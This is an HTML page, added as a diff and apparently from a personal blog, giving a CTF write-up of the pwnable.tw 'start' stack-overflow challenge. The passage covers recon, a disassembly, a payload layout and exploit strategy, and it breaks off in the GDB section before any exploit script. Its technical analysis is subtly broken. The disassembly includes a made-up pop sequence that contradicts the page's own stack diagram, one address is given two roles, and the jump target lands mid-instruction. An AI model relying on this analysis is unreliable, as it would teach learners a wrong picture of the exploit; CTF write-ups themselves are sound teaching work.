@@ -1,0 +1,997 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>start — pwnable.tw — QA210</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<style>
+:root{--bg:#0a0e17;--bg2:#111827;--card:#151d2e;--border:#1e293b;--fg:#e2e8f0;--muted:#94a3b8;--accent:#38bdf8;--accent2:#818cf8;--red:#f87171;--green:#4ade80;--yellow:#facc15;--orange:#fb923c;--pink:#f472b6;--font:'Segoe UI',system-ui,-apple-system,sans-serif;--mono:'Cascadia Code','Fira Code','JetBrains Mono',Consolas,monospace;--radius:8px;--shadow:0 4px 24px rgba(0,0,0,.45);--glow:0 0 30px rgba(56,189,248,.12);--yellow-accent:#facc15}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:var(--font);background:var(--bg);color:var(--fg);line-height:1.75;min-height:100vh;overflow-x:hidden}
+#bg-canvas{position:fixed;inset:0;z-index:-1;opacity:.3}
+
+/* ═══ SITE HEADER ═══ */
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+
+/* ═══ BREADCRUMB ═══ */
+.breadcrumb{display:flex;align-items:center;gap:8px;padding:18px 0 0;font-size:.78rem;color:var(--muted)}
+.breadcrumb a{color:var(--muted);text-decoration:none;transition:color .2s}
+.breadcrumb a:hover{color:var(--accent)}
+.breadcrumb .sep{color:var(--border)}
+.breadcrumb .current{color:var(--fg);font-weight:600}
+
+/* ═══ PAGE LAYOUT ═══ */
+.page-wrap{display:flex;max-width:1440px;margin:0 auto;min-height:calc(100vh - 56px)}
+.toc{position:sticky;top:56px;width:260px;min-width:260px;height:calc(100vh - 56px);overflow-y:auto;padding:20px 14px;border-right:1px solid var(--border);background:rgba(10,14,23,.85);backdrop-filter:blur(12px);scrollbar-width:thin;scrollbar-color:var(--border) transparent}
+.toc h3{font-size:.68rem;text-transform:uppercase;letter-spacing:2px;color:var(--accent);margin-bottom:10px}
+.toc a{display:block;font-size:.76rem;color:var(--muted);text-decoration:none;padding:3px 0 3px 12px;border-left:2px solid transparent;transition:all .2s}
+.toc a:hover,.toc a.active{color:var(--fg);border-left-color:var(--accent);background:rgba(56,189,248,.06)}
+.toc .toc-sub{padding-left:24px;font-size:.7rem}
+.main{flex:1;padding:36px 48px 80px;max-width:900px}
+
+/* ═══ HERO ═══ */
+.hero{text-align:center;padding:48px 0 36px;border-bottom:1px solid var(--border);margin-bottom:36px}
+.hero .badge{display:inline-block;background:linear-gradient(135deg,var(--red),var(--orange));color:#fff;font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;padding:4px 14px;border-radius:20px;margin-bottom:14px}
+.hero h1{font-size:2.2rem;font-weight:800;background:linear-gradient(135deg,var(--accent),var(--accent2),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:8px}
+.hero .sub{font-size:1rem;color:var(--muted);margin-bottom:20px}
+.hero .meta-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:20px}
+.hero .meta-box{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:12px 6px;text-align:center}
+.meta-box .val{font-size:1.3rem;font-weight:700;color:var(--accent)}
+.meta-box .lbl{font-size:.62rem;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-top:2px}
+
+/* ═══ ATTACK PATH ═══ */
+.attack-path{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:24px;margin:28px 0;overflow-x:auto}
+.attack-path h3{font-size:.78rem;text-transform:uppercase;letter-spacing:1.5px;color:var(--accent);margin-bottom:14px;text-align:center}
+.path-flow{display:flex;align-items:center;justify-content:center;gap:5px;flex-wrap:wrap}
+.path-node{background:linear-gradient(135deg,rgba(56,189,248,.12),rgba(129,140,248,.12));border:1px solid var(--accent);border-radius:6px;padding:7px 12px;font-size:.7rem;font-weight:600;color:var(--fg);white-space:nowrap;transition:all .25s}
+.path-node:hover{background:linear-gradient(135deg,rgba(56,189,248,.25),rgba(129,140,248,.25));transform:translateY(-2px);box-shadow:var(--glow)}
+.path-arrow{color:var(--accent);font-size:1rem;flex-shrink:0}
+
+/* ═══ SECTIONS ═══ */
+.section{margin-bottom:44px}
+.section h2{font-size:1.5rem;font-weight:700;margin-bottom:18px;padding-bottom:8px;border-bottom:2px solid var(--accent);display:flex;align-items:center;gap:10px}
+.section h2 .icon{font-size:1.2rem}
+.section h3{font-size:1.1rem;font-weight:600;margin:26px 0 12px;color:var(--accent2)}
+.section h4{font-size:.92rem;font-weight:600;margin:18px 0 8px;color:var(--accent)}
+.section p{margin-bottom:13px;color:var(--fg)}
+.section ul,.section ol{margin:10px 0 16px 24px}
+.section li{margin-bottom:6px;color:var(--fg)}
+
+/* ═══ CALLOUTS ═══ */
+.callout{border-radius:var(--radius);padding:14px 18px;margin:18px 0;border-left:4px solid;font-size:.88rem}
+.callout p{margin-bottom:7px}.callout p:last-child{margin-bottom:0}
+.callout-info{background:rgba(56,189,248,.08);border-color:var(--accent)}
+.callout-warn{background:rgba(250,204,21,.08);border-color:var(--yellow)}
+.callout-danger{background:rgba(248,113,113,.08);border-color:var(--red)}
+.callout-success{background:rgba(74,222,128,.08);border-color:var(--green)}
+.callout-hint{background:rgba(129,140,248,.08);border-color:var(--accent2)}
+.callout-deadend{background:rgba(251,146,60,.06);border-color:var(--orange)}
+.callout-title{font-weight:700;font-size:.76rem;text-transform:uppercase;letter-spacing:1px;margin-bottom:5px}
+.callout-info .callout-title{color:var(--accent)}.callout-warn .callout-title{color:var(--yellow)}
+.callout-danger .callout-title{color:var(--red)}.callout-success .callout-title{color:var(--green)}
+.callout-hint .callout-title{color:var(--accent2)}.callout-deadend .callout-title{color:var(--orange)}
+
+/* ═══ CODE ═══ */
+.code-block{position:relative;margin:14px 0;border-radius:var(--radius);overflow:hidden;border:1px solid var(--border)}
+.code-block .code-header{display:flex;align-items:center;justify-content:space-between;background:#1a1f2e;padding:5px 12px;font-size:.68rem;color:var(--muted)}
+.code-block .code-header .lang-tag{font-weight:600;text-transform:uppercase;letter-spacing:1px;color:var(--accent)}
+.code-block pre{margin:0!important;padding:14px!important;font-size:.8rem!important;line-height:1.6!important;background:#0d1117!important}
+.code-block code{font-family:var(--mono)!important;font-size:.8rem!important}
+.copy-btn{background:transparent;border:1px solid var(--border);color:var(--muted);font-size:.63rem;padding:2px 8px;border-radius:4px;cursor:pointer;transition:all .2s}
+.copy-btn:hover{color:var(--fg);border-color:var(--accent)}
+
+/* ═══ BADGES & TABLES ═══ */
+.mitre-badge{display:inline-block;background:rgba(244,114,182,.1);border:1px solid rgba(244,114,182,.25);color:var(--pink);font-size:.63rem;font-weight:600;padding:2px 7px;border-radius:4px;margin:2px;font-family:var(--mono)}
+.data-table{width:100%;border-collapse:collapse;margin:14px 0;font-size:.83rem}
+.data-table th{background:var(--card);padding:9px 12px;text-align:left;font-size:.68rem;text-transform:uppercase;letter-spacing:1px;color:var(--accent);border-bottom:2px solid var(--border)}
+.data-table td{padding:9px 12px;border-bottom:1px solid var(--border);color:var(--fg)}
+.data-table tr:hover td{background:rgba(56,189,248,.04)}
+.data-table code{font-family:var(--mono);font-size:.78rem;color:var(--accent)}
+
+/* ═══ SPECIAL ═══ */
+.flag-box{background:linear-gradient(135deg,rgba(74,222,128,.08),rgba(34,211,238,.08));border:1px solid rgba(74,222,128,.25);border-radius:var(--radius);padding:12px 18px;margin:14px 0;display:flex;align-items:center;gap:12px}
+.flag-box .flag-icon{font-size:1.2rem}.flag-box .flag-name{font-weight:700;color:var(--green);font-size:.83rem;font-family:var(--mono)}.flag-box .flag-detail{font-size:.78rem;color:var(--muted)}
+.network-diagram{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:22px;margin:22px 0;font-family:var(--mono);font-size:.66rem;line-height:1.35;color:var(--muted);overflow-x:auto;white-space:pre}
+.timeline{position:relative;padding-left:26px;margin:18px 0}
+.timeline::before{content:'';position:absolute;left:8px;top:0;bottom:0;width:2px;background:var(--border)}
+.timeline-item{position:relative;margin-bottom:18px}
+.timeline-item::before{content:'';position:absolute;left:-22px;top:6px;width:9px;height:9px;border-radius:50%;background:var(--accent);border:2px solid var(--bg)}
+.timeline-item.struggle::before{background:var(--orange)}.timeline-item.fail::before{background:var(--red)}
+.timeline-item .tl-time{font-size:.68rem;font-family:var(--mono);color:var(--accent);margin-bottom:2px}
+.timeline-item.struggle .tl-time{color:var(--orange)}.timeline-item.fail .tl-time{color:var(--red)}
+.timeline-item .tl-text{font-size:.83rem;color:var(--fg)}
+.term-out{background:#0c0c0c;border:1px solid var(--border);border-radius:var(--radius);padding:12px 16px;margin:12px 0;font-family:var(--mono);font-size:.74rem;line-height:1.5;color:#ccc;overflow-x:auto;white-space:pre-wrap;word-break:break-all}
+.term-out .prompt{color:var(--accent)}.term-out .err{color:var(--red)}.term-out .ok{color:var(--green)}.term-out .warn{color:var(--yellow)}.term-out .muted{color:#666}
+.operator-sig{text-align:center;padding:28px 0;border-top:1px solid var(--border);margin-top:44px}
+.operator-sig .handle{font-size:1.1rem;font-weight:700;background:linear-gradient(135deg,var(--accent),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.operator-sig .tagline{font-size:.76rem;color:var(--muted);margin-top:4px}
+
+/* ═══ STACK DIAGRAM ═══ */
+.stack-diagram{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:16px 20px;margin:14px 0;font-family:var(--mono);font-size:.76rem;line-height:1.7}
+.stack-row{display:flex;align-items:center;gap:10px;padding:3px 0;border-bottom:1px solid rgba(30,41,59,.5)}
+.stack-row:last-child{border-bottom:none}
+.stack-addr{color:var(--accent);min-width:80px;font-size:.72rem}
+.stack-label{color:var(--muted);min-width:140px;font-size:.72rem}
+.stack-value{color:var(--fg);font-size:.72rem}
+.stack-overflow{color:var(--red);font-weight:700}
+.stack-controlled{color:var(--green);font-weight:700}
+.stack-comment{color:var(--yellow);font-style:italic;font-size:.7rem}
+
+/* ═══ MOBILE NAV ═══ */
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+
+/* ═══ RESPONSIVE ═══ */
+@media(max-width:960px){
+.toc{display:none}
+.main{padding:20px 18px 60px}
+.hero h1{font-size:1.5rem}
+.hero .meta-grid{grid-template-columns:repeat(2,1fr)}
+.path-flow{flex-direction:column}.path-arrow{transform:rotate(90deg)}
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+}
+::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:var(--muted)}
+</style>
+</head>
+<body>
+
+<canvas id="bg-canvas"></canvas>
+
+<!-- ═══════════ HEADER ═══════════ -->
+<header class="site-header">
+  <a href="/" class="brand">
+    <span class="logo-icon">Q</span>
+    QA210<span class="cursor"></span>
+  </a>
+  <nav class="nav-main">
+    <a href="/">Home</a>
+    <a href="/htb/">Hack The Box</a>
+    <a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a>
+    <a href="/pwnable-tw/" class="active">Pwnable.tw</a>
+    <a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <a href="https://w4llz.me/" target="_blank" class="social-link" title="W4LLZ Team" style="color:var(--yellow-accent)"><i class="bi bi-people-fill"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<!-- Mobile Nav -->
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a>
+    <a href="/htb/">Hack The Box</a>
+    <a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a>
+    <a href="/pwnable-tw/">Pwnable.tw</a>
+    <a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a>
+    <a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+    <a href="https://w4llz.me/" target="_blank">W4LLZ Team</a>
+  </nav>
+</div>
+
+<div class="page-wrap">
+
+<!-- ═══════════ TOC ═══════════ -->
+<nav class="toc" id="toc">
+  <h3>Table of Contents</h3>
+  <a href="#recon">1. Reconnaissance</a>
+  <a class="toc-sub" href="#recon-file">File Analysis</a>
+  <a class="toc-sub" href="#recon-checksec">Checksec</a>
+  <a class="toc-sub" href="#recon-run">Running the Binary</a>
+  <a href="#static">2. Static Analysis</a>
+  <a class="toc-sub" href="#static-disasm">Disassembly</a>
+  <a class="toc-sub" href="#static-decompiled">Decompiled C</a>
+  <a class="toc-sub" href="#static-vuln">Vulnerability Analysis</a>
+  <a href="#gdb">3. GDB Debugging</a>
+  <a class="toc-sub" href="#gdb-stack">Stack Layout</a>
+  <a class="toc-sub" href="#gdb-registers">Register State</a>
+  <a class="toc-sub" href="#gdb-breakpoints">Breakpoints</a>
+  <a href="#strategy">4. Exploit Strategy</a>
+  <a class="toc-sub" href="#strategy-overview">Attack Overview</a>
+  <a class="toc-sub" href="#strategy-leak">Stack Leak</a>
+  <a class="toc-sub" href="#strategy-shellcode">Shellcode Execution</a>
+  <a href="#pwn">5. Pwn Script</a>
+  <a class="toc-sub" href="#pwn-full">Full Exploit</a>
+  <a class="toc-sub" href="#pwn-shellcode">Shellcode Breakdown</a>
+  <a href="#results">6. Execution Results</a>
+</nav>
+
+<div class="main">
+
+<!-- BREADCRUMB -->
+<div class="breadcrumb">
+  <a href="/">Home</a>
+  <span class="sep"><i class="bi bi-chevron-right"></i></span>
+  <a href="/pwnable-tw/">Pwnable.tw</a>
+  <span class="sep"><i class="bi bi-chevron-right"></i></span>
+  <span class="current">start</span>
+</div>
+
+<!-- ──── HERO ──── -->
+<section class="hero">
+  <span class="badge">pwnable.tw &mdash; 100 pts</span>
+  <h1>start</h1>
+  <p class="sub">Just a start &mdash; Stack BOF with shellcode execution on a minimal i386 binary</p>
+  <div class="meta-grid">
+    <div class="meta-box"><div class="val">32-bit</div><div class="lbl">Architecture</div></div>
+    <div class="meta-box"><div class="val">0</div><div class="lbl">Protections</div></div>
+    <div class="meta-box"><div class="val">0x14</div><div class="lbl">Buffer Size</div></div>
+    <div class="meta-box"><div class="val">~50</div><div class="lbl">Lines of ASM</div></div>
+  </div>
+</section>
+
+<div class="attack-path">
+  <h3>Exploit Flow</h3>
+  <div class="path-flow">
+    <div class="path-node">Connect<br><small>nc chall.pwnable.tw 10000</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">BOF #1<br><small>Leak Stack Addr</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">Hijack EIP<br><small>0x08048087</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">Read Leak<br><small>ESP from write()</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">BOF #2<br><small>RSP + Shellcode</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">Shell<br><small>execve("/bin/sh")</small></div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 1 — RECONNAISSANCE     -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="recon">
+  <h2><i class="bi bi-search"></i> 1. Reconnaissance</h2>
+  <p>The "start" challenge lives up to its name &mdash; it's the introductory pwn challenge on pwnable.tw. The binary is tiny, hand-written in assembly, with zero modern protections. But that doesn't make it trivial if you've never done a stack leak before. The key insight is that the binary <em>pushes ESP to the stack</em> before the return address, giving us a clean stack pointer leak when we redirect execution back to the <code>write</code> syscall.</p>
+
+  <h3 id="recon-file">File Analysis</h3>
+  <p>Download the binary and check what we're dealing with:</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">$ file start
+start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped</code></pre>
+  </div>
+
+  <p>The binary is a 32-bit x86 ELF, statically linked and not stripped. It's incredibly small &mdash; only a few hundred bytes. This is a hand-crafted assembly binary with no libc, no standard boilerplate, just raw syscalls.</p>
+
+  <h3 id="recon-checksec">Checksec</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">$ checksec start
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x08048000)</code></pre>
+  </div>
+
+  <div class="callout callout-success">
+    <div class="callout-title">All Protections Disabled</div>
+    <p>No canary means we can overflow freely. No NX means the stack is executable &mdash; we can put shellcode directly on the stack and jump to it. No PIE means all addresses are fixed and predictable. No RELRO means GOT is writable (though we don't need it here). This is the ideal environment for a classic stack-based exploit.</p>
+  </div>
+
+  <h3 id="recon-run">Running the Binary</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">$ ./start
+Let's start the CTF:</code></pre>
+  </div>
+
+  <p>The binary prints "Let's start the CTF:" and waits for input. It reads up to 0x3c (60) bytes but only allocates 0x14 (20) bytes of buffer on the stack. That's our overflow window &mdash; 60 bytes of input into a 20-byte buffer. We can overwrite the saved EIP and beyond.</p>
+
+  <div class="callout callout-info">
+    <div class="callout-title">Connection Info</div>
+    <p>Remote target: <code>nc chall.pwnable.tw 10000</code>. The binary is the same locally and remotely &mdash; no sandboxing or additional restrictions.</p>
+  </div>
+
+  <table class="data-table">
+    <thead><tr><th>Attribute</th><th>Value</th></tr></thead>
+    <tbody>
+      <tr><td>Challenge</td><td>start (100 pts)</td></tr>
+      <tr><td>Connection</td><td><code>nc chall.pwnable.tw 10000</code></td></tr>
+      <tr><td>Binary</td><td>32-bit ELF, i386, statically linked</td></tr>
+      <tr><td>Canary</td><td>None</td></tr>
+      <tr><td>NX</td><td>Disabled (stack executable)</td></tr>
+      <tr><td>PIE</td><td>Disabled (fixed base 0x08048000)</td></tr>
+      <tr><td>RELRO</td><td>None</td></tr>
+      <tr><td>Buffer Size</td><td>0x14 (20) bytes</td></tr>
+      <tr><td>Read Size</td><td>0x3c (60) bytes</td></tr>
+      <tr><td>Vulnerability</td><td>Stack Buffer Overflow</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 2 — STATIC ANALYSIS    -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="static">
+  <h2><i class="bi bi-code-slash"></i> 2. Static Analysis</h2>
+  <p>The binary is so small that the entire disassembly fits on one screen. There's only one function &mdash; <code>_start</code> &mdash; and it does exactly two things: write a message to stdout, then read input from stdin. No libc, no standard runtime, just raw Linux syscalls via <code>int 0x80</code>.</p>
+
+  <h3 id="static-disasm">Full Disassembly</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">x86 asm</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-x86asm">_start:
+    0x08048060:  push   esp                    ; save current ESP to stack
+    0x08048061:  push   0x0804809d             ; push return address (_exit)
+    0x08048066:  xor    eax, eax               ; eax = 0
+    0x08048068:  xor    ebx, ebx               ; ebx = 0 (stdout fd)
+    0x0804806a:  xor    ecx, ecx               ; ecx = 0
+    0x0804806c:  xor    edx, edx               ; edx = 0
+    0x0804806e:  push   0x3a                   ; ':'
+    0x08048070:  push   0x74736354             ; 'TCTs' (little-endian)
+    0x08048075:  push   0x20656874             ; 'the '
+    0x0804807a:  push   0x20747261             ; 'art '
+    0x0804807f:  push   0x74732073             ; 's st'
+    0x08048084:  mov    ecx, esp               ; ecx = pointer to string
+    0x08048086:  mov    dl, 0x14               ; edx = 20 (length)
+    0x08048088:  mov    bl, 1                  ; ebx = 1 (stdout)
+    0x0804808a:  mov    al, 4                  ; eax = 4 (sys_write)
+    0x0804808c:  int    0x80                   ; syscall: write(1, msg, 20)
+
+    0x0804808e:  xor    ebx, ebx               ; ebx = 0 (stdin fd)
+    0x08048090:  mov    dl, 0x3c               ; edx = 60 (max read bytes)
+    0x08048092:  mov    al, 3                  ; eax = 3 (sys_read)
+    0x08048094:  int    0x80                   ; syscall: read(0, esp, 60)
+
+_exit:
+    0x08048096:  pop    esp                    ; restore ESP
+    0x08048097:  pop    eax                    ; pop return address into eax???
+    0x08048098:  pop    ebx
+    0x08048099:  pop    ecx
+    0x0804809a:  pop    edx
+    0x0804809b:  pop    esi
+    0x0804809c:  pop    edi
+    0x0804809d:  pop    ebp                    ; 0x0804809d — pushed at start
+    0x0804809e:  ret                             ; return (EIP = popped value)</code></pre>
+  </div>
+
+  <div class="callout callout-hint">
+    <div class="callout-title">Key Observation: push esp</div>
+    <p>The very first instruction is <code>push esp</code>. This saves the current stack pointer onto the stack. Later, the <code>_exit</code> routine pops values back off the stack &mdash; including that saved ESP. If we can redirect execution back to the <code>write</code> syscall at <code>0x08048087</code> (after the pushes), the <code>mov ecx, esp</code> instruction will point <code>ecx</code> at our stack data, and <code>write</code> will dump it to stdout &mdash; including the saved ESP value. This is our stack leak.</p>
+  </div>
+
+  <h3 id="static-decompiled">Decompiled C (Pseudocode)</h3>
+  <p>To make this easier to understand, here's what the binary does in C:</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">void _start() {
+    char buf[20];  // 0x14 bytes on stack
+
+    // sys_write(1, "Let's start the CTF:", 20)
+    write(1, "Let's start the CTF:", 20);
+
+    // sys_read(0, buf, 60) — VULNERABILITY: reads 60 bytes into 20-byte buffer
+    read(0, buf, 60);
+
+    // The function "returns" by popping saved registers
+    // If we overflow past the return address, we control EIP
+}</code></pre>
+  </div>
+
+  <h3 id="static-vuln">Vulnerability Analysis</h3>
+  <p>The vulnerability is straightforward: <code>read(0, buf, 60)</code> reads up to 60 bytes into a 20-byte stack buffer. This gives us 40 bytes of overflow past the buffer boundary. Let's map out what's on the stack:</p>
+
+  <div class="stack-diagram">
+    <div class="stack-row">
+      <span class="stack-addr">esp+0x00</span>
+      <span class="stack-label">buf[0..19]</span>
+      <span class="stack-value">"Let's start the CTF:" (our input overwrites this)</span>
+    </div>
+    <div class="stack-row">
+      <span class="stack-addr">esp+0x14</span>
+      <span class="stack-label">saved ESP</span>
+      <span class="stack-value stack-overflow">&larr; pushed by 'push esp' at entry</span>
+    </div>
+    <div class="stack-row">
+      <span class="stack-addr">esp+0x18</span>
+      <span class="stack-label">return addr</span>
+      <span class="stack-value stack-controlled">&larr; 0x0804809d (we overwrite this!)</span>
+    </div>
+    <div class="stack-row">
+      <span class="stack-addr">esp+0x1c</span>
+      <span class="stack-label">popped into ebx</span>
+      <span class="stack-value">overwritten by us</span>
+    </div>
+    <div class="stack-row">
+      <span class="stack-addr">esp+0x20</span>
+      <span class="stack-label">popped into ecx</span>
+      <span class="stack-value">overwritten by us</span>
+    </div>
+    <div class="stack-row">
+      <span class="stack-addr">esp+0x24</span>
+      <span class="stack-label">popped into edx</span>
+      <span class="stack-value">overwritten by us</span>
+    </div>
+    <div class="stack-row">
+      <span class="stack-addr">esp+0x28</span>
+      <span class="stack-label">popped into esi</span>
+      <span class="stack-value">overwritten by us</span>
+    </div>
+    <div class="stack-row">
+      <span class="stack-addr">esp+0x2c</span>
+      <span class="stack-label">popped into edi</span>
+      <span class="stack-value">overwritten by us</span>
+    </div>
+    <div class="stack-row">
+      <span class="stack-addr">esp+0x30</span>
+      <span class="stack-label">popped into ebp</span>
+      <span class="stack-value">overwritten by us</span>
+    </div>
+    <div class="stack-row">
+      <span class="stack-addr">esp+0x34+</span>
+      <span class="stack-label">SHELLCODE SPACE</span>
+      <span class="stack-value stack-controlled">&larr; our shellcode goes here!</span>
+    </div>
+  </div>
+
+  <p>Wait &mdash; let me re-examine the stack layout more carefully. The <code>_exit</code> routine does <code>pop esp</code> first, which means the saved ESP value determines the new stack pointer. Then it pops eax through ebp and returns. The critical path is:</p>
+
+  <div class="callout callout-warn">
+    <div class="callout-title">The pop esp Problem</div>
+    <p>After the <code>read</code> syscall returns, execution falls through to <code>_exit</code> at <code>0x08048096</code>. The first instruction there is <code>pop esp</code>, which loads the value at the top of the stack into ESP. If we overflow the buffer, the value at the top of the stack is our input data. This means <strong>we control ESP</strong> after the overflow. The subsequent pops and <code>ret</code> all use this new ESP value. We need to be very careful about what values end up where.</p>
+  </div>
+
+  <p>Actually, let's trace through more carefully. After <code>read()</code> returns, ESP still points to the buffer. The pops in <code>_exit</code> consume 8 values from the stack: esp, eax, ebx, ecx, edx, esi, edi, ebp. The <code>ret</code> then pops the next value as EIP. So our payload layout is:</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">payload layout</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-plaintext">Offset  Size  Popped Into  Our Control
+------  ----  -----------  -----------
+0x00    20    (buffer)     'A' * 20 (padding)
+0x14    4     pop esp      stack_addr (set new ESP)
+0x18    4     pop eax      junk (doesn't matter)
+0x1c    4     pop ebx      junk
+0x20    4     pop ecx      junk
+0x24    4     pop edx      junk
+0x28    4     pop esi      junk
+0x2c    4     pop edi      junk
+0x30    4     pop ebp      junk
+0x34    4     ret (EIP)    address of our shellcode!
+0x38+   ???   SHELLCODE    execve("/bin/sh") shellcode</code></pre>
+  </div>
+
+  <div class="callout callout-hint">
+    <div class="callout-title">Simpler Approach: Redirect Before _exit</div>
+    <p>Instead of dealing with all those pops, we can overwrite the return address (at offset 0x14 from the start of the pushed values) with <code>0x08048087</code> &mdash; the address right before <code>mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80</code>. This causes the binary to re-execute the <code>write</code> syscall, which dumps the current stack contents to us. Since <code>push esp</code> was the very first instruction, the saved ESP value is still on the stack &mdash; and it gets leaked through <code>write</code>.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 3 — GDB DEBUGGING      -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="gdb">
+  <h2><i class="bi bi-bug"></i> 3. GDB Debugging</h2>
+  <p>Time to verify our understanding with GDB. The key things to confirm: the stack layout, the offset to the return address, and what values are on the stack when the write syscall executes.</p>
+
+  <h3 id="gdb-stack">Stack Layout at read() Return</h3>
+  <p>Let's set a breakpoint after the <code>read</code> syscall and examine the stack:</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">gdb</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">gdb-peda$ b *0x08048094
+Breakpoint 1 at 0x8048094
+
+gdb-peda$ r
+Let's start the CTF:
+AAAA                    # send 4 bytes of input
+
+# After read returns, examine the stack:
+gdb-peda$ x/20wx $esp
+0xffffd0c0: 0x41414141  0x0804809d  0x00000000  0x00000000
+0xffffd0d0: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd0e0: 0x00000000  0x00000000  0x00000000  0x00000000</code></pre>
+  </div>
+
+  <p>Interesting &mdash; we only sent 4 bytes, but notice that <code>0x0804809d</code> is visible at <code>esp+4</code>. That's the pushed return address from <code>push 0x0804809d</code> at the beginning. But where's the pushed ESP? Let's look more carefully:</p>
+
+  <div class="code-block">
